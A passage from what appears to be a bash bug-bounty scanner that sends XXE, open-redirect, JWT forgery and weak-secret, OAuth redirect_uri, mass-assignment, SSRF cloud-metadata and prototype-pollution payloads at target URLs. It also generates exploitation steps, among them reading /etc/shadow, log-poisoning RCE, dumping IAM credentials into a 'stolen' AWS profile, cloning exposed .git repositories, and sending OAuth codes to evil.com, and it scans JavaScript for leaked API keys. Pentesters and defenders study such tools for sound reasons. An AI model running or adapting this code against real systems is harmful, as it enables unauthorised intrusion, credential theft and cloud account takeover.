                "1. Confirm: curl '$TEST' | grep root\n2. Read: /etc/shadow, /etc/hosts\n3. RCE path: include /var/log/apache2/access.log after injecting PHP into User-Agent"
            break
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -30)

# ── 7f. XXE (XML External Entity) ────────────────────────────────────────
log_info "XXE testing..."
: > "$INJ_DIR/xxe_findings.txt"
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
while IFS= read -r url; do
    check_skip || break
    RESP=$(t_run 15 curl -sk --max-time 12 -X POST \
        -H "Content-Type: application/xml" \
        -d "$XXE_PAYLOAD" "$url" 2>/dev/null)
    echo "$RESP" | grep -qP "root:.*:0:0" && {
        echo "[XXE] $url" >> "$INJ_DIR/xxe_findings.txt"
        log_critical "XXE: $url"
        write_poc \
            "XXE — XML External Entity Injection" "CRITICAL" "A05:2025 Injection" "$url" \
            "curl -sk -X POST -H 'Content-Type: application/xml' \\\n  -d '${XXE_PAYLOAD}' '$url'" \
            "XML parser resolves external entity — reads /etc/passwd. Can escalate to SSRF or internal network scan." \
            "1. POST XXE payload to $url\n2. Observe /etc/passwd in response\n3. Blind: DTD via OOB callback\n4. SSRF: SYSTEM \"http://169.254.169.254/latest/meta-data/\""
    }
done < <(grep -iE "/(api|upload|xml|soap|import|rss|atom|parse)" \
    "$MASTER_WEB" 2>/dev/null | head -20)

log_success "SQLi: $(count_lines "$INJ_DIR/sqli_findings.txt") | XSS: $(count_lines "$INJ_DIR/xss_findings.txt") | NoSQLi: $(count_lines "$INJ_DIR/nosql_findings.txt")"
log_success "SSTI: $(count_lines "$INJ_DIR/ssti_findings.txt") | LFI: $(count_lines "$INJ_DIR/lfi_findings.txt") | XXE: $(count_lines "$INJ_DIR/xxe_findings.txt")"
end_phase 7
fi


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 8: OWASP A07 — AUTHENTICATION FAILURES (JWT, OAuth, Open Redirect)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 8; then
start_phase 8 "OWASP A07 — AUTHENTICATION FAILURES (JWT, OAuth, Open Redirect)"
log_owasp "A07:2025 Authentication Failures"

AUTH_DIR="$OUT_DIR/05-owasp/a07-auth"

# ── 8a. Open Redirect ─────────────────────────────────────────────────────
log_info "Open redirect testing..."
: > "$AUTH_DIR/open_redirect.txt"
REDIR_PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com"
    "https://evil.com%23" "https://evil.com%3F" "///evil.com"
    "https:evil.com" "javascript:alert(1)")
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP \
        "[?&](redirect|next|url|return|returnUrl|return_url|goto|dest|destination|redir|ref|callback|continue|target|to|forward)=" \
        | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for payload in "${REDIR_PAYLOADS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$payload")
        TEST="${URL}?${PARAM}=${ENC}"
        LOC=$(t_run 12 curl -sk -I --max-time 8 \
            -L --max-redirs 0 "$TEST" 2>/dev/null \
            | grep -i "^location:" | tr -d '\r' | cut -d' ' -f2-)
        echo "$LOC" | grep -qiE "(evil\.com|attacker\.com)" && {
            echo "[OPEN REDIRECT] $TEST → $LOC" >> "$AUTH_DIR/open_redirect.txt"
            log_found "Open Redirect: $TEST → $LOC"
            write_poc \
                "Open Redirect" "MEDIUM" "A07:2025 Authentication Failures" "$TEST" \
                "curl -sk -I -L --max-redirs 0 '$TEST' | grep -i location" \
                "Server redirects to arbitrary external URL — phishing / credential harvest vector." \
                "1. Navigate: $TEST\n2. User redirected to $payload\n3. Combine with login flow → credential phishing"
            break
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -50)
check_skip || { end_phase 8; }

# ── 8b. JWT Testing ───────────────────────────────────────────────────────
log_info "JWT security testing..."
: > "$AUTH_DIR/jwt_findings.txt"
while IFS= read -r url; do
    check_skip || break
    # Look for JWT in response headers
    RESP_HDR=$(t_run 12 curl -sk -I --max-time 8 "$url" 2>/dev/null | tr -d '\r')
    JWT=$(echo "$RESP_HDR" | grep -oP "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" \
        | head -1)
    [ -z "$JWT" ] && {
        # Try auth endpoint
        JWT=$(t_run 12 curl -sk --max-time 10 "$url" 2>/dev/null \
            | grep -oP "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" | head -1)
    }
    [ -z "$JWT" ] && continue

    # Decode header
    HEADER_B64=$(echo "$JWT" | cut -d'.' -f1)
    HEADER=$(printf '%s' "$HEADER_B64" | python3 -c "
import sys,base64,json
try:
    s=sys.stdin.read().strip()
    pad=4-len(s)%4
    if pad<4: s+=('='*pad)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(s))))
except: print('{}')" 2>/dev/null)

    ALG=$(echo "$HEADER" | python3 -c "
import sys,json
try: print(json.loads(sys.stdin.read()).get('alg','?'))
except: print('?')" 2>/dev/null)

    printf "[JWT FOUND] %s | alg:%s\n" "$url" "$ALG" >> "$AUTH_DIR/jwt_findings.txt"

    # alg:none bypass
    NONE_HDR=$(printf '{"alg":"none","typ":"JWT"}' | python3 -c "
import sys,base64
print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).rstrip(b'=').decode())" 2>/dev/null)
    PAYLOAD_B64=$(echo "$JWT" | cut -d'.' -f2)
    NONE_JWT="${NONE_HDR}.${PAYLOAD_B64}."
    CODE_NONE=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
        -H "Authorization: Bearer $NONE_JWT" "$url" 2>/dev/null || echo "000")
    [[ "$CODE_NONE" == "200" ]] && {
        echo "[JWT ALG:NONE BYPASS] $url | unsigned token accepted" \
            >> "$AUTH_DIR/jwt_findings.txt"
        log_critical "JWT alg:none bypass: $url"
        write_poc \
            "JWT Algorithm None Bypass" "CRITICAL" "A07:2025 Authentication Failures" "$url" \
            "# Build unsigned JWT\nHDR=\$(echo '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0)\nPAYLOAD='<base64_payload_from_your_token>'\ncurl -sk -H \"Authorization: Bearer \${HDR}.\${PAYLOAD}.\" '$url'" \
            "Server accepts JWT with alg:none — no signature verification. Any user data can be forged." \
            "1. Obtain any valid JWT\n2. Change header alg to 'none'\n3. Remove signature (keep trailing dot)\n4. Modify payload: change user_id/role\n5. Send modified token → access granted"
    }

    # weak secret test (HS256 with common secrets)
    [[ "$ALG" == "HS256" ]] && {
        for secret in "secret" "password" "123456" "admin" "$DOMAIN" ""; do
            RESIGN=$(echo "$JWT" | python3 -c "
import sys,hmac,hashlib,base64
tok=sys.stdin.read().strip()
parts=tok.split('.')
secret='$secret'.encode()
msg=(parts[0]+'.'+parts[1]).encode()
sig=hmac.new(secret,msg,hashlib.sha256).digest()
b64=base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(parts[0]+'.'+parts[1]+'.'+b64)" 2>/dev/null)
            [ -n "$RESIGN" ] && CODE_WEAK=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" \
                --max-time 8 -H "Authorization: Bearer $RESIGN" "$url" \
                2>/dev/null || echo "000")
            [[ "$CODE_WEAK" == "200" ]] && {
                echo "[JWT WEAK SECRET] $url | secret:'$secret'" >> "$AUTH_DIR/jwt_findings.txt"
                log_critical "JWT weak secret '$secret': $url"
                break
            }
        done
    }
done < <(grep -iE "/(api|auth|login|user|me|profile|account)" "$MASTER_WEB" 2>/dev/null | head -20)
check_skip || { end_phase 8; }

# ── 8c. OAuth misconfiguration ────────────────────────────────────────────
log_info "OAuth misconfiguration testing..."
: > "$AUTH_DIR/oauth_findings.txt"
grep -iE "(oauth|authorize|redirect_uri|response_type=code)" \
    "$MASTER_ENDPOINTS" 2>/dev/null | sort -u \
    > "$AUTH_DIR/oauth_endpoints.txt" || true

while IFS= read -r ourl; do
    check_skip || break
    # Missing state parameter (CSRF)
    echo "$ourl" | grep -qi "state=" || {
        echo "[OAUTH NO CSRF STATE] $ourl" >> "$AUTH_DIR/oauth_findings.txt"
        log_found "OAuth missing CSRF state: $ourl"
    }
    # redirect_uri bypass
    TEST=$(echo "$ourl" | sed 's|redirect_uri=[^&]*|redirect_uri=https://evil.com|g')
    [ "$TEST" != "$ourl" ] && {
        LOC=$(t_run 12 curl -sk -I --max-time 8 "$TEST" 2>/dev/null \
            | grep -i "^location:" | tr -d '\r' || true)
        echo "$LOC" | grep -qi "evil.com" && {
            echo "[OAUTH REDIRECT BYPASS] $ourl" >> "$AUTH_DIR/oauth_findings.txt"
            log_found "OAuth redirect_uri bypass: $ourl"
            write_poc \
                "OAuth redirect_uri Not Validated" "HIGH" \
                "A07:2025 Authentication Failures" "$ourl" \
                "curl -sk -I '${TEST}' | grep -i location" \
                "OAuth redirect_uri accepts arbitrary external domains — auth codes can be stolen." \
                "1. Intercept OAuth request\n2. Change redirect_uri to https://evil.com\n3. User authorizes → code sent to evil.com\n4. Exchange code for access token"
        }
    }
done < <(safe_cat "$AUTH_DIR/oauth_endpoints.txt" | head -20)

log_success "Open redirects: $(count_lines "$AUTH_DIR/open_redirect.txt")"
log_success "JWT issues: $(count_lines "$AUTH_DIR/jwt_findings.txt")"
log_success "OAuth issues: $(count_lines "$AUTH_DIR/oauth_findings.txt")"
end_phase 8
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 9: OWASP A06 — INSECURE DESIGN (RACE CONDITIONS + BUSINESS LOGIC)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 9; then
start_phase 9 "OWASP A06 — INSECURE DESIGN (RACE CONDITIONS + BUSINESS LOGIC)"
log_owasp "A06:2025 Insecure Design"

DESIGN_DIR="$OUT_DIR/05-owasp/a06-design"

# ── 9a. Race condition detection ─────────────────────────────────────────
log_info "Race condition candidates..."
: > "$DESIGN_DIR/race_candidates.txt"
grep -iE "/(redeem|coupon|voucher|transfer|withdraw|apply|claim|purchase|checkout|pay|order)" \
    "$MASTER_ENDPOINTS" 2>/dev/null | sort -u \
    > "$DESIGN_DIR/race_candidates.txt" || true
log_stat "Race condition candidates: $(count_lines "$DESIGN_DIR/race_candidates.txt")"
[ -s "$DESIGN_DIR/race_candidates.txt" ] && {
    log_found "Potential race condition endpoints found — manual test recommended"
    cat >> "$DESIGN_DIR/race_candidates.txt" << 'RACE_NOTES'

# RACE CONDITION MANUAL TEST (Burp Suite Turbo Intruder):
# python script for Turbo Intruder:
# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint,
#                            concurrentConnections=30,
#                            requestsPerConnection=30,
#                            pipeline=True)
#     for i in range(30):
#         engine.queue(target.req)
# def handleResponse(req, interesting):
#     if 'success' in req.response.lower():
#         table.add(req)

# bash parallel test:
# for i in $(seq 1 20); do
#   curl -sk -X POST <ENDPOINT> -d '<PARAMS>' &
# done; wait
RACE_NOTES
}
check_skip || { end_phase 9; }

# ── 9b. Business logic — negative/boundary values ────────────────────────
log_info "Business logic — boundary value testing..."
: > "$DESIGN_DIR/logic_findings.txt"
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&](amount|price|qty|quantity|count|total|balance|num)=" \
        | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for val in "-1" "0" "-9999" "0.001" "99999999" "2147483648"; do
        check_skip || break
        TEST="${URL}?${PARAM}=${val}"
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 8 "$TEST" 2>/dev/null || echo "000")
        RESP=$(t_run 12 curl -sk --max-time 10 "$TEST" 2>/dev/null | head -c 500)
        [[ "$CODE" == "200" ]] && \
        ! echo "$RESP" | grep -qiE "(invalid|error|must be positive|out of range)" && {
            echo "[BUSINESS LOGIC] $TEST | val:$val | status:$CODE" \
                >> "$DESIGN_DIR/logic_findings.txt"
            log_found "Business logic: $TEST (val=$val accepted)"
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -30)
check_skip || { end_phase 9; }

# ── 9c. Mass Assignment ───────────────────────────────────────────────────
log_info "Mass assignment testing..."
: > "$DESIGN_DIR/mass_assignment.txt"
MA_FIELDS=('{"role":"admin"}' '{"is_admin":true}' '{"admin":1}'
    '{"privilege":"superuser"}' '{"account_type":"premium"}' '{"verified":true}')
while IFS= read -r url; do
    check_skip || break
    CT=$(t_run 10 curl -sk -I --max-time 8 "$url" 2>/dev/null \
        | grep -i "content-type:" | tr -d '\r')
    echo "$CT" | grep -qi "json" || continue
    BASE_CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
        --max-time 8 -X PUT -H "Content-Type: application/json" \
        -d '{"name":"test"}' "$url" 2>/dev/null || echo "000")
    for field in "${MA_FIELDS[@]}"; do
        check_skip || break
        CODE=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            -X PUT -H "Content-Type: application/json" \
            -d "$field" "$url" 2>/dev/null || echo "000")
        [[ "$CODE" == "200" || "$CODE" == "201" ]] && \
        [[ "$CODE" == "$BASE_CODE" ]] && {
            echo "[MASS ASSIGN CANDIDATE] $url | field:$field | code:$CODE" \
                >> "$DESIGN_DIR/mass_assignment.txt"
            log_found "Mass assignment candidate: $url"
            break
        }
    done
done < <(grep -iE "/(api|user|profile|account|settings|update)" \
    "$MASTER_WEB" 2>/dev/null | head -20)

log_success "Race candidates: $(count_lines "$DESIGN_DIR/race_candidates.txt")"
log_success "Logic findings: $(count_lines "$DESIGN_DIR/logic_findings.txt")"
log_success "Mass assign: $(count_lines "$DESIGN_DIR/mass_assignment.txt")"
end_phase 9
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 10: OWASP A04 — CRYPTOGRAPHIC FAILURES (TLS, SENSITIVE DATA EXPOSURE)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 10; then
start_phase 10 "OWASP A04 — CRYPTOGRAPHIC FAILURES & SENSITIVE DATA EXPOSURE"
log_owasp "A04:2025 Cryptographic Failures"

CRYPTO_DIR="$OUT_DIR/05-owasp/a04-crypto"

# ── 10a. TLS/SSL analysis ─────────────────────────────────────────────────
log_info "TLS/SSL analysis..."
: > "$CRYPTO_DIR/tls_findings.txt"
while IFS= read -r url; do
    check_skip || break
    HOST=$(echo "$url" | grep -oP "(?<=https://)([^/]+)" | head -1)
    [ -z "$HOST" ] && continue

    # TLS version check
    TLS_INFO=$(t_run 15 curl -sk -v --max-time 10 "https://${HOST}/" 2>&1 \
        | grep -iE "SSL|TLS|version" | head -5 || true)
    echo "$TLS_INFO" | grep -qiE "TLSv1\.0|TLSv1\.1|SSLv" && {
        echo "[WEAK TLS] $HOST | $(echo "$TLS_INFO" | head -1)" \
            >> "$CRYPTO_DIR/tls_findings.txt"
        log_found "Weak TLS: $HOST"
    }

    # Self-signed / expired cert
    CERT_INFO=$(t_run 15 openssl s_client -connect "${HOST}:443" \
        -servername "$HOST" < /dev/null 2>/dev/null | openssl x509 -noout \
        -issuer -subject -dates 2>/dev/null || true)
    echo "$CERT_INFO" | grep -qi "self-signed\|self signed" && {
        echo "[SELF-SIGNED CERT] $HOST" >> "$CRYPTO_DIR/tls_findings.txt"
        log_found "Self-signed cert: $HOST"
    }
    EXPIRY=$(echo "$CERT_INFO" | grep "notAfter" | cut -d= -f2)
    [ -n "$EXPIRY" ] && {
        EXP_EPOCH=$(date -d "$EXPIRY" +%s 2>/dev/null || true)
        NOW_EPOCH=$(date +%s)
        [ -n "$EXP_EPOCH" ] && [ "$EXP_EPOCH" -lt "$NOW_EPOCH" ] && {
            echo "[EXPIRED CERT] $HOST | expired: $EXPIRY" >> "$CRYPTO_DIR/tls_findings.txt"
            log_found "Expired cert: $HOST"
        }
    }

    # HTTP (no TLS)
    echo "$url" | grep -q "^http://" && {
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 8 "$url" 2>/dev/null || echo "000")
        [[ "$CODE" != "000" ]] && \
            echo "[HTTP NO TLS] $url" >> "$CRYPTO_DIR/tls_findings.txt"
    }
done < <(safe_cat "$MASTER_WEB" | head -30)
check_skip || { end_phase 10; }

# ── 10b. Sensitive data in responses ──────────────────────────────────────
log_info "Sensitive data exposure..."
: > "$CRYPTO_DIR/sensitive_data.txt"
SENSITIVE_PAT='(password|passwd|secret|api_key|apikey|access_token|private_key|aws_secret|db_password|connection_string|auth_token)[^\n]{0,5}[=:]\s*["'"'"'][^"'"'"']{6,}'
while IFS= read -r url; do
    check_skip || break
    RESP=$(t_run 15 curl -sk --max-time 12 "$url" 2>/dev/null | head -c 50000)
    HITS=$(echo "$RESP" | grep -ioP "$SENSITIVE_PAT" | head -5)
    [ -n "$HITS" ] && {
        printf "[SENSITIVE DATA] %s\n%s\n\n" "$url" "$HITS" \
            >> "$CRYPTO_DIR/sensitive_data.txt"
        log_found "Sensitive data in response: $url"
    }
done < <(safe_cat "$MASTER_WEB" | head -30)
check_skip || { end_phase 10; }

# ── 10c. Git/.env/config exposure ─────────────────────────────────────────
log_info "Config/secret file exposure..."
: > "$CRYPTO_DIR/exposed_files.txt"
SENSITIVE_PATHS=(
    "/.git/config" "/.git/HEAD" "/.env" "/.env.local" "/.env.production"
    "/config.php" "/config.yml" "/config.yaml" "/database.yml"
    "/wp-config.php" "/web.config" "/settings.py" "/config.json"
    "/app.config" "/secrets.yml" "/credentials.json" "/.htpasswd"
    "/backup.sql" "/dump.sql" "/database.sql" "/.DS_Store"
    "/phpinfo.php" "/info.php" "/test.php" "/debug.php"
    "/server-status" "/server-info" "/_profiler" "/telescope"
    "/actuator" "/actuator/env" "/actuator/mappings" "/actuator/health"
    "/api/swagger.json" "/swagger.json" "/openapi.json" "/api-docs"
    "/graphql" "/graphiql" "/__graphql" "/v1/graphql"
)
while IFS= read -r base; do
    check_skip || break
    BASE_DOMAIN=$(echo "$base" | grep -oP "https?://[^/]+")
    for path in "${SENSITIVE_PATHS[@]}"; do
        check_skip || break
        TEST="${BASE_DOMAIN}${path}"
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
            --max-time 8 "$TEST" 2>/dev/null || echo "000")
        [[ "$CODE" == "200" || "$CODE" == "301" ]] && {
            SIZE=$(t_run 10 curl -sk --max-time 8 "$TEST" 2>/dev/null | wc -c || echo 0)
            # FP filter: must have reasonable content
            [ "${SIZE:-0}" -gt 20 ] && {
                # Secondary FP filter: not a 404-disguised page
                BODY=$(t_run 10 curl -sk --max-time 8 "$TEST" 2>/dev/null | head -c 500)
                ! echo "$BODY" | grep -qiE "(not found|page not found|404)" && {
                    echo "[EXPOSED FILE] $TEST | Status:$CODE | Size:${SIZE}b" \
                        >> "$CRYPTO_DIR/exposed_files.txt"
                    log_found "Exposed file: $TEST ($CODE, ${SIZE}b)"
                    # Special: verify git config content
                    [[ "$path" == "/.git/config" ]] && \
                        echo "$BODY" | grep -qi "\[core\]" && {
                            log_critical "Git repo exposed: ${BASE_DOMAIN}/.git/"
                            write_poc \
                                "Git Repository Exposed" "CRITICAL" \
                                "A04:2025 Cryptographic Failures" "$TEST" \
                                "# Download full git repo:\ngit clone ${BASE_DOMAIN}/.git/ ./extracted_repo\n# or: wget -r --no-parent ${BASE_DOMAIN}/.git/" \
                                "Full git history, source code, secrets, and credentials accessible." \
                                "1. curl ${BASE_DOMAIN}/.git/config → confirms git repo\n2. Download: git-dumper ${BASE_DOMAIN}/.git/ repo/\n3. Search: grep -r 'password\\|secret\\|key' repo/\n4. git log --all → full commit history"
                        }
                    # Special: verify .env content
                    [[ "$path" == "/.env" || "$path" == "/.env.production" ]] && \
                        echo "$BODY" | grep -qiE "(DB_|APP_KEY|SECRET|TOKEN|AWS)" && {
                            log_critical ".env file with secrets: $TEST"
                            write_poc \
                                ".env File Exposed with Credentials" "CRITICAL" \
                                "A04:2025 Cryptographic Failures" "$TEST" \
                                "curl -sk '$TEST'" \
                                "Environment file contains credentials/keys in plaintext." \
                                "1. curl '$TEST'\n2. Extract: DB_HOST, DB_USER, DB_PASS → direct DB access\n3. Extract: APP_KEY → Laravel decrypt sessions\n4. Extract: AWS_KEY/SECRET → cloud takeover"
                        }
                }
            }
        }
        sleep 0.1
    done
done < <(safe_cat "$MASTER_WEB" | head -30)

log_success "TLS issues: $(count_lines "$CRYPTO_DIR/tls_findings.txt")"
log_success "Sensitive data: $(count_lines "$CRYPTO_DIR/sensitive_data.txt")"
log_success "Exposed files: $(count_lines "$CRYPTO_DIR/exposed_files.txt")"
end_phase 10
fi


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 11: SSRF — SERVER-SIDE REQUEST FORGERY
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 11; then
start_phase 11 "SSRF — SERVER-SIDE REQUEST FORGERY & CLOUD METADATA"
log_owasp "A01:2025 Broken Access Control / A02:2025 Misconfiguration"

SSRF_DIR="$OUT_DIR/05-owasp/a01-access-control"

grep -iE "(\?|&)(url|uri|path|src|source|dest|redirect|next|forward|callback|load|fetch|host|target|proxy|image|img|api|resource|data|href|link|file|page|connect|file_url|download)=" \
    "$MASTER_ENDPOINTS" 2>/dev/null | sort -u \
    > "$SSRF_DIR/ssrf_candidates.txt" || true
log_stat "SSRF candidates: $(count_lines "$SSRF_DIR/ssrf_candidates.txt")"

: > "$OUT_DIR/07-cloud/aws_metadata_hits.txt"
AWS_PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/computeMetadata/v1/"
    "http://100.100.100.200/latest/meta-data/"
    "http://[::ffff:169.254.169.254]/latest/meta-data/"
    "http://0251.0376.0251.0376/latest/meta-data/"
)

while IFS= read -r url; do
    check_skip || break
    PNAME=$(echo "$url" | grep -oP "[?&]\K[a-z_]+=https?://[^&]+" | head -1 | cut -d= -f1)
    [ -z "$PNAME" ] && continue
    for payload in "${AWS_PAYLOADS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$payload")
        TEST=$(echo "$url" | sed "s|${PNAME}=[^&]*|${PNAME}=${ENC}|")
        RESP=$(t_run 12 curl -sk --max-time 10 "$TEST" 2>/dev/null)
        echo "$RESP" | grep -qiE "ami-id|instance-id|AccessKeyId|security-credentials|iam/info|computeMetadata" && {
            echo "[SSRF AWS METADATA] $TEST" >> "$OUT_DIR/07-cloud/aws_metadata_hits.txt"
            echo "$RESP" | head -10 >> "$OUT_DIR/07-cloud/aws_metadata_hits.txt"
            log_critical "SSRF→AWS Metadata: $TEST"
            write_poc \
                "SSRF → AWS Instance Metadata Service (IMDS)" "CRITICAL" \
                "A01:2025 Broken Access Control" "$TEST" \
                "# 1. Confirm SSRF\ncurl -sk '${TEST}'\n\n# 2. Get IAM role\ncurl -sk '$(echo "$url" | sed "s|${PNAME}=[^&]*|${PNAME}=$(urlencode "http://169.254.169.254/latest/meta-data/iam/security-credentials/")|")'\n\n# 3. Get credentials (replace ROLE)\ncurl -sk '$(echo "$url" | sed "s|${PNAME}=[^&]*|${PNAME}=$(urlencode "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME")|")'" \
                "SSRF reaches AWS IMDS. IAM credentials (AccessKeyId/SecretAccessKey/Token) extractable. Full cloud account compromise possible." \
                "1. Confirm: inject http://169.254.169.254/latest/meta-data/\n2. Get role: /latest/meta-data/iam/security-credentials/\n3. Dump creds: /latest/meta-data/iam/security-credentials/ROLE_NAME\n4. Configure: aws configure --profile stolen\n5. Test: aws s3 ls / aws iam list-users"
            break
        }
    done
done < <(safe_cat "$SSRF_DIR/ssrf_candidates.txt" | head -25)
check_skip || { end_phase 11; }

# OOB SSRF via interactsh
[ "$OOB_MODE" = true ] && command -v interactsh-client &>/dev/null && \
[ "${PHASE_SKIP:-false}" = false ] && {
    log_info "OOB SSRF (interactsh)..."
    OOB_HOST=$(t_run 20 interactsh-client -n 1 -json 2>/dev/null | \
        python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('url',''))" \
        2>/dev/null || true)
    [ -n "$OOB_HOST" ] && {
        log_info "OOB host: $OOB_HOST"
        safe_cat "$SSRF_DIR/ssrf_candidates.txt" | head -15 | while IFS= read -r url; do
            PNAME=$(echo "$url" | grep -oP "[?&]\K[a-z_]+=https?://[^&]+" | head -1 | cut -d= -f1)
            [ -n "$PNAME" ] && {
                TEST=$(echo "$url" | sed "s|${PNAME}=[^&]*|${PNAME}=$(urlencode "http://${OOB_HOST}")|")
                t_run 10 curl -sk --max-time 8 "$TEST" -o /dev/null 2>/dev/null || true
            }
        done
        log_stat "OOB payloads sent — monitor $OOB_HOST for DNS callbacks"
    }
}

log_success "SSRF findings: $(count_lines "$OUT_DIR/07-cloud/aws_metadata_hits.txt")"
end_phase 11
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 12: ADVANCED JS — PROTOTYPE POLLUTION + DOM SINKS
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 12; then
start_phase 12 "ADVANCED JS — PROTOTYPE POLLUTION & DOM SINK ANALYSIS"
log_owasp "A05:2025 Injection / A08:2025 Data Integrity Failures"

JS_ADV_DIR="$OUT_DIR/06-js-analysis"

# ── 12a. Prototype pollution candidates ──────────────────────────────────
log_info "Prototype pollution parameter scan..."
: > "$JS_ADV_DIR/proto_pollution.txt"
PP_PARAMS=("__proto__[admin]" "constructor[prototype][admin]"
    "__proto__[isAdmin]" "constructor.prototype.admin"
    "__proto__[role]" "__proto__[debug]")
while IFS= read -r url; do
    check_skip || break
    for pp in "${PP_PARAMS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$pp")
        TEST="${url}?${ENC}=polluted_test_7777"
        RESP=$(t_run 12 curl -sk --max-time 10 "$TEST" 2>/dev/null | head -c 5000)
        echo "$RESP" | grep -q "polluted_test_7777" && {
            echo "[PROTO POLLUTION CANDIDATE] $TEST" >> "$JS_ADV_DIR/proto_pollution.txt"
            log_found "Prototype pollution candidate: $TEST"
            write_poc \
                "Prototype Pollution Candidate" "HIGH" "A05:2025 Injection" "$TEST" \
                "curl -sk '${url}?__proto__[admin]=1'\ncurl -sk '${url}?constructor[prototype][admin]=1'" \
                "Parameter reflected to object prototype — may allow privilege escalation or property injection." \
                "1. Send: $TEST\n2. Verify reflected value\n3. Test privilege escalation: __proto__[role]=admin\n4. Test XSS: __proto__[innerHTML]=<img/onerror=alert(1)>"
            break
        }
    done
done < <(safe_cat "$MASTER_WEB" | head -20)
check_skip || { end_phase 12; }

# ── 12b. DOM sink analysis in JS files ────────────────────────────────────
log_info "DOM sink analysis..."
: > "$JS_ADV_DIR/dom_sinks.txt"
DOM_SINKS="(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|location\.href|location\.hash|location\.search|document\.cookie|\.src\s*=|\.href\s*=)"
while IFS= read -r jsurl; do
    check_skip || break
    CONTENT=$(t_run 20 curl -sk --max-time 15 "$jsurl" 2>/dev/null | head -c 80000)
    [ -z "$CONTENT" ] && continue
    HITS=$(echo "$CONTENT" | grep -oP "$DOM_SINKS" 2>/dev/null | sort | uniq -c | sort -rn | head -8)
    [ -n "$HITS" ] && {
        printf "\n--- %s ---\n%s\n" "$jsurl" "$HITS" >> "$JS_ADV_DIR/dom_sinks.txt"
        log_stat "DOM sinks in: $jsurl"
    }
done < <(safe_cat "$MASTER_JS" | head -60)

# ── 12c. Exposed API keys in JS ───────────────────────────────────────────
log_info "API key pattern scan..."
: > "$JS_ADV_DIR/api_keys_found.txt"
API_KEY_PATTERNS=(
    "AIza[0-9A-Za-z_-]{35}"                     # Google API
    "AKIA[0-9A-Z]{16}"                           # AWS Access Key
    "sk_live_[0-9a-zA-Z]{24,}"                   # Stripe live key
    "pk_live_[0-9a-zA-Z]{24,}"                   # Stripe public live
    "xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24,}" # Slack token
    "ghp_[0-9a-zA-Z]{36}"                        # GitHub PAT
    "gho_[0-9a-zA-Z]{36}"                        # GitHub OAuth
    "glpat-[0-9a-zA-Z_-]{20}"                   # GitLab PAT
    "SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}" # SendGrid
    "EAACEdEose0cBA[0-9A-Za-z]+"                 # Facebook
    "sq0atp-[0-9A-Za-z_-]{22}"                  # Square
    "[0-9a-f]{32}-us[0-9]{1,2}"                 # Mailchimp
)
while IFS= read -r jsurl; do
    check_skip || break
    CONTENT=$(t_run 20 curl -sk --max-time 15 "$jsurl" 2>/dev/null | head -c 100000)
    [ -z "$CONTENT" ] && continue
    for pat in "${API_KEY_PATTERNS[@]}"; do
        HITS=$(echo "$CONTENT" | grep -oP "$pat" 2>/dev/null | head -3)
        [ -n "$HITS" ] && {
            printf "[API KEY] %s | Pattern: %s | Value: %s\n" "$jsurl" "$pat" "$HITS" \
                >> "$JS_ADV_DIR/api_keys_found.txt"
            log_critical "API key found: $jsurl"
        }
    done
done < <(safe_cat "$MASTER_JS" | head -80)

log_success "Proto pollution: $(count_lines "$JS_ADV_DIR/proto_pollution.txt")"
log_success "DOM sinks: $(count_lines "$JS_ADV_DIR/dom_sinks.txt")"
log_success "API keys: $(count_lines "$JS_ADV_DIR/api_keys_found.txt")"
end_phase 12
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 13: SUBDOMAIN TAKEOVER + DNS DANGLING
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 13; then
